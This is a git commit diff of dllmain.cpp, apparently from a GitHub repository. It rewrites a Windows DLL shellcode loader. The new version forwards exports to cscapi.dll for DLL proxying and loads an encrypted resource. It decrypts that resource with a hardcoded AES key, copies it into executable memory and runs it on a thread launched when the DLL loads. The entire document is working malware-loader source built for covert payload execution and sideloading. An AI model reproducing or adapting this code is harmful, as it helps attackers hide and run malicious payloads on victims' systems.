3c72bfe56f331d65acba26b67bfdd2611b3abb69
d@tvn <157048397+dt97-K76@users.noreply.github.com>
2025-06-16 07:44:15 +0700

    Add files via upload

--- dllmain.cpp
+++ dllmain.cpp
@@ -5,81 +5,94 @@
 #include "resource.h"
 
 #pragma comment(lib, "bcrypt.lib")
+#pragma comment(linker, "/export:CscNetApiGetInterface=cscapi.CscNetApiGetInterface")
+#pragma comment(linker, "/export:CscSearchApiGetInterface=cscapi.CscSearchApiGetInterface")
+#pragma comment(linker, "/export:OfflineFilesEnable=cscapi.CscNetApiGetInterface")
+#pragma comment(linker, "/export:OfflineFilesGetShareCachingMode=cscapi.OfflineFilesGetShareCachingMode")
+#pragma comment(linker, "/export:OfflineFilesQueryStatus=cscapi.OfflineFilesQueryStatus")
+#pragma comment(linker, "/export:OfflineFilesQueryStatusEx=cscapi.OfflineFilesQueryStatusEx")
+#pragma comment(linker, "/export:OfflineFilesStart=cscapi.OfflineFilesStart")
 
-void decrypt(BYTE* buf, size_t dwSize) {
-    static const BYTE keyss[] = {
-        0x4b, 0x44, 0x42, 0x4d, 0x01, 0x00, 0x00, 0x00,
-        0x10, 0x00, 0x00, 0x00, 0x68, 0x65, 0x6c, 0x6c,
-        0x6f, 0x69, 0x73, 0x73, 0x73, 0x73, 0x73, 0x73,
-        0x73, 0x73, 0x73, 0x73
-    };
 
-    BCRYPT_ALG_HANDLE hAlg = NULL;
-    BCRYPT_KEY_HANDLE hKey = NULL;
-    DWORD cbKeyObject = 0, cbResult = 0;
+static const BYTE keyss[] = { 0x4b,0x44,0x42,0x4d,0x01,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x68,0x65,0x6c,0x6c,0x6f,0x69,0x73,0x73,0x73,0x73,0x73,0x73,0x73,0x73,0x73,0x73 };
+
+BOOL decrypt(LPBYTE shellcode, DWORD shellcodeLen) {
+    BCRYPT_ALG_HANDLE phalgorithm;
+    LPCWSTR pszImplementation = NULL;
+    BCryptOpenAlgorithmProvider(&phalgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
+    BCryptSetProperty(phalgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
     NTSTATUS status;
+    BCRYPT_KEY_HANDLE phkey;
+    DWORD pboutput;
+    ULONG pcbresult;
 
-    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
-    if (!BCRYPT_SUCCESS(status)) return;
+    PVOID shell = VirtualAlloc(NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!shell) return 1;
 
-    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
-        sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
-    if (!BCRYPT_SUCCESS(status)) return;
+    memcpy(shell, shellcode, shellcodeLen);
+    if ((status = BCryptGetProperty(phalgorithm, BCRYPT_OBJECT_LENGTH, (PUCHAR)&pboutput, sizeof(DWORD), &pcbresult, 0)) != 0) {
+        //printf("[+] Error Occured while Getting Key property of Algorithm: %X\n", status);
+        exit(0);
+    }
 
-    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject,
-        sizeof(DWORD), &cbResult, 0);
-    if (!BCRYPT_SUCCESS(status)) return;
+    LPVOID heapmemory_key_import = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, pboutput);
 
-    PUCHAR pbKeyObject = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
-    if (!pbKeyObject) return;
+    if ((status = BCryptImportKey(phalgorithm, NULL, BCRYPT_KEY_DATA_BLOB, &phkey, (PUCHAR)heapmemory_key_import, pboutput, (PUCHAR)keyss, sizeof(keyss), 0)) != 0) {
+        //printf("[+] Error Occured while Importing Key: %X\n", status);
+        exit(0);
+    }
 
-    status = BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, &hKey,
-        pbKeyObject, cbKeyObject,
-        (PUCHAR)keyss, sizeof(keyss), 0);
-    if (!BCRYPT_SUCCESS(status)) return;
 
-    PUCHAR pbDecrypted = (PUCHAR)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    ULONG cbDecrypted = 0;
+    LPVOID heapmemory_buf = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, shellcodeLen);
+    ULONG decrypted_size;
 
-    status = BCryptDecrypt(hKey, buf, (ULONG)dwSize, NULL, NULL, 0,
-        pbDecrypted, (ULONG)dwSize, &cbDecrypted, BCRYPT_BLOCK_PADDING);
-    if (!BCRYPT_SUCCESS(status)) return;
+    if ((status = BCryptDecrypt(phkey, (PUCHAR)heapmemory_buf, shellcodeLen, NULL, NULL, 0, NULL, 0, &decrypted_size, BCRYPT_BLOCK_PADDING)) != 0) {
+        //printf("[+] Error: %X\n", status);
+        exit(0);
+    }
 
-    ((void(*)())pbDecrypted)(); // Run shellcode
+    ULONG pcbresult_decrypt_new;
 
-    VirtualFree(pbDecrypted, 0, MEM_RELEASE);
-    HeapFree(GetProcessHeap(), 0, pbKeyObject);
-    BCryptDestroyKey(hKey);
-    BCryptCloseAlgorithmProvider(hAlg, 0);
+    if ((status = BCryptDecrypt(phkey, (PUCHAR)shell, shellcodeLen, NULL, NULL, 0, (PUCHAR)shell, decrypted_size, &pcbresult_decrypt_new, BCRYPT_BLOCK_PADDING)) != 0) {
+        //printf("[+] Error: %X\n", status);
+        exit(0);
+    }
+
+ 
+    ((void(*)())shell)();
+
+    return 1;
+
 }
 
-int shell(HMODULE hMod) {
+DWORD WINAPI shell(LPVOID lpParam) {
+
+    HMODULE hMod = (HMODULE)lpParam;
+
     HRSRC hRsrc = FindResourceW(hMod, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
-    if (!hRsrc) {
-        printf("FindResourceW failed: %d\n", GetLastError());
-        return -1;
-    }
+    if (!hRsrc) return 1;
 
     HGLOBAL hGRsrc = LoadResource(hMod, hRsrc);
-    if (!hGRsrc) {
-        printf("LoadResource failed: %d\n", GetLastError());
-        return -1;
-    }
+    if (!hGRsrc) return 1;
 
     PVOID pData = LockResource(hGRsrc);
-    if (!pData) {
-        printf("LockResource failed: %d\n", GetLastError());
-        return -1;
-    }
+    if (!pData) return 1;
 
     DWORD dwSize = SizeofResource(hMod, hRsrc);
-    decrypt((BYTE*)pData, dwSize);
-    return 0;
+
+
+    if (!decrypt((LPBYTE)pData, dwSize)) {
+        return 1;
+    }
+  
+
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    HANDLE threadhandle;
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
-        shell(hModule);
+        threadhandle = CreateThread(NULL, 0, shell, hModule, 0, NULL);
+        CloseHandle(threadhandle);
     }
     return TRUE;
 }
